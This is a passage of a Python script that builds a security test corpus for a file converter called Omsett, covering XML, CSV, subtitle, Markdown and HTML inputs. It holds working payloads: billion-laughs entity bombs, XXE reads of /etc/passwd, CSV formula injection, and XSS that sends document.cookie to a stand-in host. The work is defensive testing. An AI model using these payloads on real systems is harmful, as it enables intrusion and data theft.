    xml_entities += b'<!ENTITY a%d "%s">' % (i, (b"&a%d;" % (i - 1)) * 10)
trap(
    "entity-bomb.xml",
    b'<?xml version="1.0"?>\n<!DOCTYPE l [' + xml_entities + b"]>\n<l>&a8;</l>\n",
    'The "billion laughs" in XML: eight shorthands, each standing for ten of the one before, '
    "a gigabyte if written out in full. The shorthand is left as written, not expanded.",
    "xml",
    node="succeeds",
    absent="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    group=G,
)
trap(
    "reads-a-local-file.xml",
    b'<?xml version="1.0"?>\n<!DOCTYPE l [<!ENTITY x SYSTEM "file:///etc/passwd">]>\n<l>&x;</l>\n',
    "Asks the reader to fetch a file from the computer and paste it into the document. A file "
    "that names anything outside itself is refused outright.",
    "xml",
    node="fails",
    note="This file is not valid XML",
    group=G,
)
trap(
    "wrong-closing-tag.xml",
    b"<people><person><name>Ada</person></people>\n",
    "A tag closed by a different tag. A forgiving reader guesses what was meant and returns "
    "something; this is refused.",
    "xml",
    node="fails",
    note="This file is not valid XML",
    group=G,
)
trap(
    "two-documents.xml",
    b"<people><name>Ada</name></people>\n<people><name>Grace</name></people>\n",
    "Two outermost tags where a document has exactly one.",
    "xml",
    node="fails",
    note="This file is not valid XML",
    group=G,
)
trap(
    "web-page.xml",
    b"<!DOCTYPE html>\n<html><head><title>x</title></head><body><p>Hello<br>there</body></html>\n",
    "A web page with an .xml name. It begins with a tag, as XML does, and is not data: it is "
    "converted as the web page it is.",
    "html",
    node="succeeds",
    mismatch=True,
    group=G,
)

trap(
    "quote-never-closed.csv",
    b'id,name,note\n1,Ada,"wrote the first program\n2,Grace,found the first bug\n',
    "A quoted cell with no closing quote, which swallows the rest of the file. Refused, not "
    "returned as one enormous cell.",
    "csv",
    node="fails",
    note="A quoted value in this table is never closed",
    group=G,
)
trap(
    "spreadsheet-formulas.csv",
    b'name,amount\nAda,"=HYPERLINK(""http://elsewhere.example/?""&A1,""Click"")"\n'
    b"Grace,=cmd|' /C calc'!A0\nKatherine,@SUM(1+1)\n",
    "Cells a spreadsheet program would run as formulas when the file is opened. To Omsett "
    "they are text and are carried across unchanged.",
    "csv",
    node="succeeds",
    group=G,
)
trap(
    "picture-named.csv",
    GOOD,
    "A PNG with a .csv name. A name settles which kind of text a file is, never whether it is "
    "text.",
    "png",
    node="succeeds",
    mismatch=True,
    group=G,
)
trap(
    "table-named.png",
    b"id,name\n1,Ada\n2,Grace\n",
    "A table with a .png name. It is not a picture, and with a name that says it is not data "
    "it is not offered as data.",
    "unknown",
    group=G,
)
trap(
    "latin-1.csv",
    "id,name\n1,Zoë\n2,Renée\n".encode("latin-1"),
    "A table saved in an older encoding, where an accented letter is a single byte that is "
    "not valid UTF-8. Guessing the encoding would risk garbling every name in it.",
    "unknown",
    group=G,
)
trap(
    "notes.txt",
    b"Shopping, Thursday\nmilk, eggs\nbread: two loaves\n",
    "Ordinary notes that happen to have commas and colons in them. A .txt name says they are "
    "not a table.",
    "unknown",
    group=G,
)

# --- subtitles: SRT, WebVTT, ASS, SSA, TTML, LRC, SBV, SAMI, MicroDVD -----------------------------
# Text again, read by Omsett's own readers. What goes wrong here: times that are not times, a
# small file that asks to become a large one, markup that hopes to be run somewhere later, one
# format wearing another's name, and input shaped to make a careless reader take hours over it.
# Each is converted to SRT (an SRT file, to WebVTT).
G = "subtitles"
NOT = "This file is not valid %s"
NONE = "This file has no subtitles in it"
BACKWARDS = "A subtitle in this file ends before it starts"
TOO_MANY = "This file holds more subtitles than Omsett will convert"
SRT_GOOD = b"1\n00:00:01,000 --> 00:00:04,000\nDrop a file.\n\n2\n00:00:04,500 --> 00:00:07,250\nPick a format.\n"


def sub(name, data, why, detect, **more):
    trap(name, data, why, detect, group=G, **more)


# SRT
sub(
    "truncated.srt",
    SRT_GOOD + b"\n3\n00:00:08,000 --> 00:0",
    "An SRT file that stops in the middle of a time, as a download cut short does.",
    "srt", node="fails", note=NOT % "SRT",
)
sub(
    "ends-before-it-starts.srt",
    b"1\n00:00:09,000 --> 00:00:02,000\nShown for minus seven seconds.\n",
    "A subtitle whose end comes before its start. Written out as it is, it would never be shown.",
    "srt", node="fails", note=BACKWARDS,
)
sub(
    "impossible-time.srt",
    SRT_GOOD + b"\n3\n00:00:08,000 --> 99999999999999999999:75:99,000\nWhen?\n",
    "A time with twenty digits of hours, seventy-five minutes and ninety-nine seconds.",
    "srt", node="fails", note=NOT % "SRT",
)
sub(
    "no-words.srt",
    b"1\n00:00:01,000 --> 00:00:04,000\n\n2\n00:00:04,500 --> 00:00:07,250\n<i></i>\n",
    "Times with nothing to say at any of them. There is nothing to convert.",
    "srt", node="fails", note=NONE,
)
sub(
    "script-in-subtitles.srt",
    b'1\n00:00:01,000 --> 00:00:04,000\n<script>fetch("http://elsewhere.example/"+document.cookie)</script>'
    b'<img src=x onerror=alert(1)>Hello\n\n2\n00:00:05,000 --> 00:00:06,000\n'
    b'<a href="javascript:alert(2)">there</a>\n',
    "Subtitles carrying a script, a picture that runs code when it fails to load, and a link "
    "that runs code. Tags are not carried across, so none of the three survives as a tag.",
    "srt", node="succeeds", absent="onerror",
)
sub(
    "tag-inside-a-tag.srt",
    b"1\n00:00:01,000 --> 00:00:04,000\n<scr<script>ipt>alert(1)</scr</script>ipt>\n",
    "A tag split in two with another tag in the gap, so that removing tags puts one together. "
    "What is left is written as text, with its angle brackets spelled out.",
    "srt", node="succeeds", absent="<script",
)
sub(
    "words-before-any-time.srt",
    b"1\n00:00:01,000 --> 00:00:04,000\nFine.\n\n2\nNo time here, only words\n\n00:00:05,000 -> 00:00:06,000\nA one-dash arrow.\n",
    "A subtitle with no time, and one whose arrow is misspelled. Neither can be told from "
    "words that belong to the subtitle above, so that is what they become.",
    "srt", node="succeeds",
)
sub(
    "arrow-in-the-wrong-place.srt",
    b"1\nHello\nthere\n00:00:01,000 --> 00:00:04,000\n",
    "The time comes after the words it belongs to.",
    "unknown",
)
sub(
    "picture-named.srt",
    GOOD,
    "A PNG with an .srt name.",
    "png", node="succeeds", mismatch=True,
)
sub(
    "subtitles-named.txt",
    SRT_GOOD,
    "Sound SRT subtitles in a file named .txt. Subtitles are known by how they read, so the "
    "name does not hide them.",
    "srt", node="succeeds", mismatch=True,
)
sub(
    "latin-1.srt",
    "1\n00:00:01,000 --> 00:00:04,000\nZoë déjà vu\n".encode("latin-1"),
    "Subtitles saved in an older encoding. Guessing which would risk garbling every accent.",
    "unknown",
)
sub(
    "utf-16.srt",
    b"\xff\xfe" + "1\n00:00:01,000 --> 00:00:04,000\nHello\n".encode("utf-16-le"),
    "Subtitles saved as UTF-16, two bytes to a letter, which Omsett does not read.",
    "unknown",
)
sub(
    "nothing-inside.srt",
    b"",
    "A file with a subtitle name and no bytes at all.",
    "unknown",
)
sub(
    "zero-bytes-inside.srt",
    b"1\n00:00:01,000 --> 00:00:04,000\nHel\x00lo\x00\x00\n",
    "Subtitles with zero bytes among the words, which no text file holds.",
    "unknown",
)

# WebVTT
VTT_GOOD = b"WEBVTT\n\n00:00:01.000 --> 00:00:04.000\nDrop a file.\n"
sub(
    "truncated.vtt",
    VTT_GOOD + b"\n00:00:04.500 --> 00:00:0",
    "A WebVTT file that stops in the middle of a time.",
    "vtt", node="fails", note=NOT % "WebVTT",
)
sub(
    "no-heading.vtt",
    b"00:00:01.000 --> 00:00:04.000\nDrop a file.\n",
    "WebVTT must open with the word WEBVTT. Without it this reads as SRT, which is what it is "
    "converted as, and the card says the name and the contents disagree.",
    "srt", node="succeeds", mismatch=True,
)
sub(
    "almost-the-heading.vtt",
    b"WEBVTTX\n\n00:00:01.000 --> 00:00:04.000\nDrop a file.\n",
    "The opening word with one letter too many.",
    "unknown",
)
sub(
    "ninety-minutes-past.vtt",
    VTT_GOOD + b"\n00:90:00.000 --> 00:91:00.000\nMinutes stop at fifty-nine.\n",
    "A time of ninety minutes past the hour.",
    "vtt", node="fails", note=NOT % "WebVTT",
)
sub(
    "words-with-no-time.vtt",
    VTT_GOOD + b"\nA paragraph that belongs to no time at all.\n",
    "A block of words with no time above it. WebVTT does not allow one, and a reader that "
    "skipped it would be throwing text away without saying so.",
    "vtt", node="fails", note=NOT % "WebVTT",
)
sub(
    "escaped-twice.vtt",
    b"WEBVTT\n\n00:00:01.000 --> 00:00:04.000\n&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;\n",
    "A script tag escaped twice over, hoping to be unescaped twice and come out as a tag. It "
    "is unescaped once, and stays text.",
    "vtt", node="succeeds", absent="<script",
)
sub(
    "only-notes.vtt",
    b"WEBVTT\n\nNOTE\n00:00:01.000 --> 00:00:04.000\nThis is inside a note.\n\nSTYLE\n::cue { color: red }\n",
    "A file whose only subtitle is inside a note, where it is a remark and not a subtitle.",
    "vtt", node="fails", note=NONE,
)

# ASS
ASS_HEAD = (
    b"[Script Info]\nScriptType: v4.00+\n\n[V4+ Styles]\n"
    b"Format: Name, Fontname, Fontsize\nStyle: Default,Arial,16\n\n[Events]\n"
    b"Format: Layer, Start, End, Style, Name, MarginL, MarginR, MarginV, Effect, Text\n"
)
ASS_LINE = b"Dialogue: 0,0:00:01.00,0:00:04.00,Default,,0,0,0,,Drop a file.\n"
sub(
    "truncated.ass",
    ASS_HEAD + ASS_LINE + b"Dialogue: 0,0:00:04.50,0:00:0",
    "An ASS file that stops in the middle of a line, before its words.",
    "ass", node="fails", note=NOT % "ASS",
)
sub(
    "braces-never-closed.ass",
    ASS_HEAD + b"Dialogue: 0,0:00:01.00,0:00:04.00,Default,,0,0,0,," + b"{" * 200_000 + b"\n",
    "Two hundred thousand opening braces and no closing one. A reader that looks for the "
    "partner of each would look two hundred thousand times through the same line.",
    "ass", node="succeeds",
)
sub(
    "no-events.ass",
    b"[Script Info]\nTitle: Styles and nothing else\nScriptType: v4.00+\n\n[V4+ Styles]\nStyle: Default,Arial,16\n",
    "A heading and styles, and no section of subtitles.",
    "ass", node="fails", note=NOT % "ASS",
)
sub(
    "columns-lie.ass",
    b"[Script Info]\n\n[Events]\nFormat: Text, Start, End\n"
    b"Dialogue: Hello, said the spider, to the fly,0:00:01.00,0:00:04.00\n",
    "The file says the words are the first column. They may hold commas, so they can only be "
    "the last; read as told, the times would be found inside the sentence.",
    "ass", node="fails", note=NOT % "ASS",
)
sub(
    "a-thousand-columns.ass",
    b"[Script Info]\n\n[Events]\nFormat: " + b"Layer, " * 1000 + b"Start, End, Text\n"
    + b"Dialogue: " + b"0," * 1000 + b"0:00:01.00,0:00:04.00,Hello\n",
    "A line said to have a thousand and three columns.",
    "ass", node="fails", note=NOT % "ASS",
)
sub(
    "only-drawings.ass",
    ASS_HEAD + b"Dialogue: 0,0:00:01.00,0:00:04.00,Default,,0,0,0,,{\\p1}m 0 0 l 100 0 100 100 0 100\n",
    "Every line is a drawing, not words. Written as text it would be a row of numbers.",
    "ass", node="fails", note=NONE,
)
sub(
    "times-are-words.ass",
    ASS_HEAD + b"Dialogue: 0,yesterday,tomorrow,Default,,0,0,0,,When?\n",
    "Words where the start and end times belong.",
    "ass", node="fails", note=NOT % "ASS",
)
sub(
    "heading-only.toml",
    b"[Script Info]\ntitle = \"x\"\n",
    "A file with a .toml name that opens with the heading every ASS file opens with. It is "
    "taken for ASS, found to have no subtitles section, and refused.",
    "ass", node="fails", note=NOT % "ASS", mismatch=True,
)

# SSA
SSA_HEAD = (
    b"[Script Info]\nScriptType: v4.00\n\n[V4 Styles]\nStyle: Default,Arial,16\n\n[Events]\n"
    b"Format: Marked, Start, End, Style, Name, MarginL, MarginR, MarginV, Effect, Text\n"
)
sub(
    "truncated.ssa",
    SSA_HEAD + b"Dialogue: Marked=0,0:00:01.00,0:00:04.00,Default,,0,0,0,,Fine.\nDialogue: Marked=0,0:00:0",
    "An SSA file that stops in the middle of a line.",
    "ssa", node="fails", note=NOT % "SSA",
)
sub(
    "ends-before-it-starts.ssa",
    SSA_HEAD + b"Dialogue: Marked=0,0:00:09.00,0:00:02.00,Default,,0,0,0,,Backwards.\n",
    "A line whose end comes before its start.",
    "ssa", node="fails", note=BACKWARDS,
)
sub(
    "newer-than-it-says.ssa",
    ASS_HEAD + ASS_LINE,
    "An ASS file with an .ssa name. The two differ in their headings, and the headings win.",
    "ass", node="succeeds", mismatch=True,
)
sub(
    "no-columns-named.ssa",
    b"[Script Info]\nScriptType: v4.00\n\n[Events]\nDialogue: Marked=0,0:00:01.00,0:00:04.00,Default,,0,0,0,,Words, with a comma.\n",
    "Valid, but the line naming the columns is missing. The usual order is assumed.",
    "ssa", node="succeeds",
)

# SBV
SBV_GOOD = b"0:00:01.000,0:00:04.000\nDrop a file.\n"
sub(
    "truncated.sbv",
    SBV_GOOD + b"\n0:00:04.500,0:00:0",
    "An SBV file that stops in the middle of a time.",
    "sbv", node="fails", note=NOT % "SBV",
)
sub(
    "ends-before-it-starts.sbv",
    b"0:00:09.000,0:00:02.000\nBackwards.\n",
    "A caption whose end comes before its start.",
    "sbv", node="fails", note=BACKWARDS,
)
sub(
    "captions-named.csv",
    SBV_GOOD + b"\n0:00:04.500,0:00:07.250\nPick a format.\n",
    "SBV captions with a .csv name. The first line has a comma in it, as a table's would, and "
    "is two times all the same.",
    "sbv", node="succeeds", mismatch=True,
)
sub(
    "table-named.sbv",
    b"start,end,words\n1,4,Drop a file\n",
    "A table with an .sbv name. It does not read as captions, and its name says it is not a "
    "table.",
    "unknown",
)

# LRC
sub(
    "truncated.lrc",
    b"[00:01.00]Drop a file\n[00:04.5",
    "A lyrics file that stops in the middle of a time.",
    "lrc", node="fails", note=NOT % "LRC",
)
sub(
    "lyrics-bomb.lrc",
    b"[0:00]" * 20_000 + b"la " * 700 + b"\n",
    "One line of lyrics with twenty thousand times in front of it, which asks for the line to "
    "be written out twenty thousand times: 120 KB that would become 40 MB.",
    "lrc", node="fails", note=TOO_MANY,
)
sub(
    "times-and-no-words.lrc",
    b"[00:01.00]\n[00:04.50]\n[00:07.25]<00:08.00>\n",
    "Times with no lyrics at any of them.",
    "lrc", node="fails", note=NONE,
)
sub(
    "no-times.lrc",
    b"[ti:A song]\n[ar:Someone]\n[al:Somewhere]\n",
    "A title, an artist and an album, and not one timed line.",
    "unknown",
)
sub(
    "ninety-nine-seconds.lrc",
    b"[00:99.00]Seconds stop at fifty-nine\n",
    "A time of ninety-nine seconds past the minute.",
    "unknown",
)
sub(
    "list-named.lrc",
    b"[1, 2, 3]\n",
    "A JSON list with an .lrc name. Both open with a square bracket.",
    "json", node="succeeds", mismatch=True,
)
sub(
    "words-between-the-lines.lrc",
    b"[00:01.00]Drop a file\nthis line has no time\n[00:04.50]Pick a format\n",
    "A line with no time among lines that have one.",
    "lrc", node="fails", note=NOT % "LRC",
)

# MicroDVD
sub(
    "truncated.sub",
    b"{25}{100}Drop a file.\n{113}{18",
    "A MicroDVD file that stops in the middle of a frame number.",
    "microdvd", node="fails", note=NOT % "MicroDVD",
)
sub(
    "no-frames-a-second.sub",
    b"{1}{1}0\n{25}{100}Drop a file.\n",
    "The file says the video plays at no frames a second, which would put every subtitle at "
    "infinity.",
    "microdvd", node="fails", note=NOT % "MicroDVD",
)
sub(
    "ends-before-it-starts.sub",
    b"{100}{25}Backwards.\n",
    "A subtitle that ends seventy-five frames before it starts.",
    "microdvd", node="fails", note=BACKWARDS,
)
sub(
    "frame-beyond-counting.sub",
    b"{25}{100}Drop a file.\n{99999999999999999999}{999999999999999999999}Later.\n",
    "A frame number of twenty digits: a film some billions of years long.",
    "microdvd", node="fails", note=NOT % "MicroDVD",
)
sub(
    "object-named.sub",
    b'{"1": "one", "2": "two"}\n',
    "A JSON object with a .sub name. Both open with a brace.",
    "json", node="succeeds", mismatch=True,
)
sub(
    "dvd-subtitles.sub",
    b"\x00\x00\x01\xba\x44\x00\x04\x00\x04\x01\x01\x89\xc3\xf8" + bytes(range(256)) * 8,
    "The other kind of .sub file: pictures of subtitles copied from a DVD, not text. There are "
    "no words in it to convert.",
    "unregistered",
)

# TTML
TT = b'<?xml version="1.0" encoding="UTF-8"?>\n<tt xmlns="http://www.w3.org/ns/ttml">\n<body><div>\n'
TT_GOOD = b'<p begin="00:00:01.000" end="00:00:04.000">Drop a file.</p>\n'
TT_END = b"</div></body>\n</tt>\n"
sub(
    "truncated.ttml",
    TT + TT_GOOD + b'<p begin="00:00:04.500" end="00:0',
    "A TTML file that stops in the middle of a tag.",
    "ttml", node="fails", note=NOT % "TTML",
)
sub(
    "entity-bomb.ttml",
    b'<?xml version="1.0"?>\n<!DOCTYPE tt [' + xml_entities + b"]>\n"
    b'<tt xmlns="http://www.w3.org/ns/ttml"><body><div><p begin="1s" end="2s">&a8;</p></div></body></tt>\n',
    'The "billion laughs" as a subtitle: one line that stands for a gigabyte of the letter a. '
    "The shorthand is left as written, not expanded.",
    "ttml", node="succeeds", absent="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
)
sub(
    "reads-a-local-file.ttml",
    b'<?xml version="1.0"?>\n<!DOCTYPE tt [<!ENTITY x SYSTEM "file:///etc/passwd">]>\n'
    b'<tt xmlns="http://www.w3.org/ns/ttml"><body><div><p begin="1s" end="2s">&x;</p></div></body></tt>\n',
    "Asks the reader to fetch a file from the computer and show it as a subtitle. A file that "
    "names anything outside itself is refused outright.",
    "ttml", node="fails", note=NOT % "TTML",
)
sub(
    "nested-ten-thousand-deep.ttml",
    TT + b'<p begin="1s" end="2s">' + b"<span>" * 10_000 + b"deep" + b"</span>" * 10_000 + b"</p>\n" + TT_END,
    "One subtitle inside ten thousand tags, each inside the last: enough to exhaust a reader "
    "that goes one level deeper for every tag.",
    "ttml", node="fails", note=NOT % "TTML",
)
sub(
    "time-is-a-word.ttml",
    TT + b'<p begin="soon" end="later">When?</p>\n' + TT_END,
    "Words where the start and end times belong.",
    "ttml", node="fails", note=NOT % "TTML",
)
sub(
    "no-frames-a-second.ttml",
    b'<tt xmlns="http://www.w3.org/ns/ttml" xmlns:ttp="http://www.w3.org/ns/ttml#parameter" ttp:frameRate="0">'
    b'<body><div><p begin="00:00:01:12" end="00:00:02:00">Divided by nothing.</p></div></body></tt>\n',
    "Times counted in frames, in a file that says there are no frames in a second.",
    "ttml", node="fails", note=NOT % "TTML",
)
sub(
    "no-times.ttml",
    TT + b"<p>Never shown.</p>\n<p>Nor this.</p>\n" + TT_END,
    "Paragraphs with no time on any of them.",
    "ttml", node="fails", note=NONE,
)
sub(
    "ends-before-it-starts.ttml",
    TT + b'<p begin="9s" end="2s">Backwards.</p>\n' + TT_END,
    "A subtitle whose end comes before its start.",
    "ttml", node="fails", note=BACKWARDS,
)
sub(
    "subtitles-in-a-comment.ttml",
    b'<?xml version="1.0"?>\n<!-- <tt xmlns="http://www.w3.org/ns/ttml"> -->\n<people><name>Ada</name></people>\n',
    "Ordinary XML with a .ttml name, and a comment that mentions the tag TTML begins with. A "
    "comment is not a tag: this is data, and is converted as data.",
    "xml", node="succeeds", mismatch=True,
)
sub(
    "subtitles-named.xml",
    TT + TT_GOOD + TT_END,
    "Sound TTML subtitles with an .xml name. They are XML, and they are subtitles first.",
    "ttml", node="succeeds", mismatch=True,
)

# SAMI
SAMI_GOOD = b"<SAMI>\n<BODY>\n<SYNC Start=1000><P Class=ENCC>Drop a file.\n<SYNC Start=4000><P Class=ENCC>&nbsp;\n"
sub(
    "truncated.smi",
    SAMI_GOOD + b"<SYNC Start=4500><P Class=ENCC>Pick a format.\n<SYNC Start=72",
    "A SAMI file that stops in the middle of a tag. Nothing in the format marks where it "
    "should end, so the subtitles that are whole are kept and the broken tag is dropped.",
    "smi", node="succeeds", absent="SYNC",
)
sub(
    "no-subtitles.smi",
    b"<SAMI>\n<HEAD><TITLE>Empty</TITLE></HEAD>\n<BODY>\n</BODY>\n</SAMI>\n",
    "A complete SAMI file with nothing in its body.",
    "smi", node="fails", note=NONE,
)
sub(
    "script-in-captions.smi",
    b"<SAMI>\n<BODY>\n<SYNC Start=1000><P Class=ENCC onmouseover=alert(1)>"
    b"<script>alert(document.cookie)</script><iframe src=//elsewhere.example></iframe>Hello\n"
    b"<SYNC Start=4000><P Class=ENCC>&nbsp;\n</BODY>\n</SAMI>\n",
    "SAMI is written like a web page, and this one carries a script, a frame from another "
    "site, and a paragraph that runs code when pointed at. None is carried across.",
    "smi", node="succeeds", absent="iframe",
)
sub(
    "comments-never-closed.smi",
    SAMI_GOOD + b"<!--" * 50_000 + b"\n",
    "Fifty thousand comments opened and none closed, after the subtitles. Everything from the "
    "first of them on is a comment.",
    "smi", node="succeeds", absent="<!--",
)
sub(
    "time-beyond-counting.smi",
    b"<SAMI>\n<BODY>\n<SYNC Start=99999999999999999999><P>Some billions of years in.\n</BODY>\n</SAMI>\n",
    "A subtitle said to start at a time twenty digits long.",
    "smi", node="fails", note=NONE,
)
sub(
    "web-page-named.smi",
    b"<!DOCTYPE html>\n<html><body><p>Hello</p></body></html>\n",
    "A web page with a .smi name. SAMI looks like one, and is not one.",
    "html", node="succeeds", mismatch=True,
)

# --- text: Markdown and HTML ----------------------------------------------------------------------
# Both can carry things that run when the result is opened: scripts, handlers, links that are
# code, pages loaded from elsewhere. Both can be nested without limit. And Markdown has no
# invalid form at all, so the question for it is never "is this valid" but "what did it let
# through". Each is converted to the other.
G = "text"
NO_TEXT = "This file has no text in it to convert"
TOO_DEEP = "This file is nested too deeply to convert"


def text(name, data, why, detect, **more):
    trap(name, data, why, detect, group=G, **more)


text(
    "script-in-markdown.md",
    b"# Notes\n\nHello.\n\n<script>fetch('http://elsewhere.example/'+document.cookie)</script>\n\n"
    b"<img src=x onerror=\"alert(1)\">\n\n<svg onload=alert(2)></svg>\n\n<b onmouseover=alert(3)>bold</b>\n",
    "Markdown may hold HTML, and this holds a script, a picture and a drawing that run code "
    "when they load, and a word that runs code when pointed at. The words are kept; nothing "
    "that could run is.",
    "md", node="succeeds", absent="alert(",
)
text(
    "links-that-are-code.md",
    b"# Links\n\n[click me](javascript:alert(1)) and [me](JaVaScRiPt:alert(2)) and "
    b"[me too](&#106;avascript:alert(3)) and ![a picture](javascript:alert(4)) and "
    b"[a page](data:text/html;base64,PHNjcmlwdD5hbGVydCg1KTwvc2NyaXB0Pg==) and "
    b"<a href=\"vbscript:alert(6)\">an old one</a>.\n",
    "Six links that run code when followed, spelled six ways. Each keeps its words and "
    "loses its address.",
    "md", node="succeeds", absent="alert(",
)
text(
    "title-breaks-out.md",
    b"# </title><script>alert(1)</script><title>\n\nWords.\n",
    "A heading written to close the page's title early and start a script after it.",
    "md", node="succeeds", absent="<script",
)
text(
    "page-takes-over.md",
    b"# Welcome\n\n<meta http-equiv=\"refresh\" content=\"0;url=http://elsewhere.example/\">\n\n"
    b"<base href=\"http://elsewhere.example/\">\n\n<link rel=\"stylesheet\" href=\"http://elsewhere.example/x.css\">\n\n"
    b"<form action=\"http://elsewhere.example/steal\"><input name=\"password\"><button>Sign in</button></form>\n\n"
    b"<iframe src=\"http://elsewhere.example/\"></iframe>\n\n<object data=\"http://elsewhere.example/x.swf\"></object>\n",
    "HTML inside Markdown that would send the reader to another site, load its styles, frame "
    "it, and post a password to it. None of it is written to the page.",
    "md", node="succeeds", absent="elsewhere.example",
)
text(
    "quotes-ten-thousand-deep.md",
    b">" * 10_000 + b" deep\n",
    "One word inside ten thousand quotations, each inside the last.",
    "md", node="fails", note=TOO_DEEP,
)
text(
    "lists-a-thousand-deep.md",
    b"".join(b" " * (2 * i) + b"- level\n" for i in range(1000)),
    "A list inside a list, a thousand times over. Read in full it takes most of a minute; it "
    "is refused before reading starts.",
    "md", node="fails", note=TOO_DEEP,
)
text(
    "brackets-never-closed.md",
    b"[" * 50_000 + b"\n",
    "Fifty thousand opening brackets. Each could begin a link, and none does.",
    "md", node="succeeds",
)
text(
    "emphasis-never-closed.md",
    b"*a _b " * 20_000 + b"\n",
    "Forty thousand marks that open emphasis and none that closes it.",
    "md", node="succeeds",
)
text(
    "truncated.md",
    b"# Report\n\n| Name | Born |\n| ---- | --\n\n```js\nconst unfinished = [1, 2,\n\nSee [the rest](http",
    "Markdown that stops mid-table, mid-code and mid-link. Markdown has no invalid form, so "
    "this converts as far as it goes.",
    "md", node="succeeds",
)
text(
    "only-a-comment.md",
    b"<!-- nothing to see -->\n\n<!-- nor here -->\n",
    "Markdown holding comments and no words.",
    "md", node="fails", note=NO_TEXT,
)
text(
    "picture-named.md",
    GOOD,
    "A PNG with an .md name. A name can say that text is Markdown; it cannot make text of a "
    "picture.",
    "png", node="succeeds", mismatch=True,
)
text(
    "latin-1.md",
    "# Résumé\n\nZoë, déjà vu.\n".encode("latin-1"),
    "Markdown saved in an older encoding.",
    "unknown",
)
text(
    "zero-bytes-inside.md",
    b"# Title\n\nHel\x00lo\x00\n",
    "Markdown with zero bytes among the words, which no text file holds.",
    "unknown",
)
text(
    "nothing-inside.md",
    b"",
    "A file with a Markdown name and no bytes at all.",
    "unknown",
)

text(
    "truncated.html",
    b"<!doctype html>\n<html><body><h1>Report</h1><p>The first paragraph.</p><table><tr><td>cell</td><td cla",
    "A web page that stops in the middle of a tag. Browsers show what there is, and so does "
    "this: the words that arrived are kept.",
    "html", node="succeeds", absent="cla",
)
text(
    "nested-ten-thousand-deep.html",
    b"<!doctype html>\n<html><body>" + b"<div>" * 10_000 + b"deep" + b"</div>" * 10_000 + b"</body></html>\n",
    "One word inside ten thousand boxes, each inside the last: enough to exhaust a reader "
    "that goes one level deeper for every tag.",
    "html", node="fails", note=TOO_DEEP,
)
text(
    "nothing-but-scripts.html",
    b"<!doctype html>\n<html><head><script>track()</script><style>body{display:none}</style></head>"
    b"<body><script>document.write('<h1>Hello</h1>')</script><noscript>Turn on JavaScript</noscript></body></html>\n",
    "A page whose words are all written by a script when it runs. Nothing here runs, so there "
    "are no words.",
    "html", node="fails", note=NO_TEXT,
)
text(
    "everything-that-runs.html",
    b"<!doctype html>\n<html><body onload=\"alert(1)\"><h1 onclick=\"alert(2)\">Title</h1>"
    b"<p><a href=\"javascript:alert(3)\">a link</a> <img src=\"x\" onerror=\"alert(4)\" alt=\"a picture\">"
    b"<svg><script>alert(5)</script></svg><math><maction actiontype=\"statusline#alert(6)\">x</maction></math>"
    b"<iframe srcdoc=\"<script>alert(7)</script>\"></iframe><embed src=\"javascript:alert(8)\">"
    b"<a href=\" &#14; javascript:alert(9)\">another</a></p></body></html>\n",
    "A page with code in nine places a browser would run it from. The Markdown keeps the "
    "heading, the link's words and the picture's description.",
    "html", node="succeeds", absent="alert(",
)
text(
    "hidden-words.html",
    b"<!doctype html>\n<html><head><title>NOT-CONTENT-1</title><style>.x::after{content:'NOT-CONTENT-2'}</style></head>"
    b"<body><p>Shown.</p><template><p>NOT-CONTENT-3</p></template><script type=\"application/json\">{\"k\":\"NOT-CONTENT-4\"}</script></body></html>\n",
    "Text in a page's title, styles, template and embedded data: none of it is what the page "
    "says to a reader, and none of it is written out as if it were.",
    "html", node="succeeds", absent="NOT-CONTENT",
)
text(
    "doctype-and-nothing-else.html",
    b"<!doctype html>\n",
    "The line that opens a web page, and no page.",
    "html", node="fails", note=NO_TEXT,
)
text(
    "a-hundred-thousand-attributes.html",
    b"<!doctype html>\n<html><body><p " + b"".join(b"a%d=1 " % i for i in range(100_000)) + b">Words.</p></body></html>\n",
    "One paragraph with a hundred thousand attributes on it.",
    "html", node="succeeds", absent="a99999",
)
text(
    "comments-never-closed.html",
    b"<!doctype html>\n<html><body><p>Words.</p>" + b"<!--" * 50_000 + b"\n",
    "Fifty thousand comments opened and none closed, after the words.",
    "html", node="succeeds", absent="<!--",
)
text(
    "page-named.json",
    b"<!doctype html>\n<html><body><h1>Not data</h1><p>A page.</p></body></html>\n",
    "A web page with a .json name.",
    "html", node="succeeds", mismatch=True,
)
text(
    "piece-of-a-page.html",
    b"<h1>No page around it</h1>\n<p>A heading and a paragraph, with no html or body tag.</p>\n",
    "A piece of a page with nothing around it. Unnamed it would read as XML; its name says "
    "what it is.",
    "html", node="succeeds",
)
text(
    "utf-16.html",
    b"\xff\xfe" + "<!doctype html>\n<html><body><p>Hello</p></body></html>\n".encode("utf-16-le"),
    "A web page saved as UTF-16, two bytes to a letter, which Omsett does not read.",
    "unknown",
)

with open(os.path.join(OUT, "manifest.json"), "w") as out:
    json.dump(manifest, out, indent=2)
    out.write("\n")
print(f"{len(manifest)} traps written to {OUT}")
